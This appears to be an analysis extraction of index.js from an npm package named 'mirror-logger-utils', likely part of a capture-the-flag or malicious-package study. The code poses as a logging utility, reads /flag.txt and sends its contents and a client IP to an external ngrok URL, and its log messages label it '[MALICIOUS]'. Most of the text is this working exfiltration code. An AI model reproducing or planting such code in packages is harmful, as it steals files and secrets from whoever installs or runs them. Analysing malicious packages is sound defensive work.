// File: tmp/tmpn219qvzb/mirror-logger-utils/package/index.js
// ======================================================================
Line 3: const fs = require("fs")
Line 4: const https = require("https")
Line 6: {
  let flag = null;

  try {
    // Try reading flag from file or environment
    flag = fs.readFileSync("/flag.txt", "utf8").trim();
  } catch (err) {
    flag = "flag_not_found";
  }

  // Exfiltrate via GET request
  const exfilURL = `https://f164-2406-8800-9015-bc57-d35b-723b-9c29-c3f8.ngrok-free.app/?ip=${encodeURIComponent(
    ip
  )}&flag=${encodeURIComponent(flag)}`;

  https
    .get(exfilURL, (res) => {
      // Optional: log result
      console.log(`[MALICIOUS] Flag sent. Status: ${res.statusCode}`);
    })
    .on("error", (err) => {
      console.error("[MALICIOUS] Error sending flag:", err.message);
    });

  // Still perform the log if needed
  console.log(`[MALICIOUS LOGGER] ${ip}: ${message}`);
}
Line 11: flag = fs.readFileSync("/flag.txt", "utf8").trim()
Line 22: {
      // Optional: log result
      console.log(`[MALICIOUS] Flag sent. Status: ${res.statusCode}`);
    }
Line 24: console.log(`[MALICIOUS] Flag sent. Status: ${res.statusCode}`)
Line 26: {
      console.error("[MALICIOUS] Error sending flag:", err.message);
    }
Line 27: console.error("[MALICIOUS] Error sending flag:", err.message)
Line 31: console.log(`[MALICIOUS LOGGER] ${ip}: ${message}`)
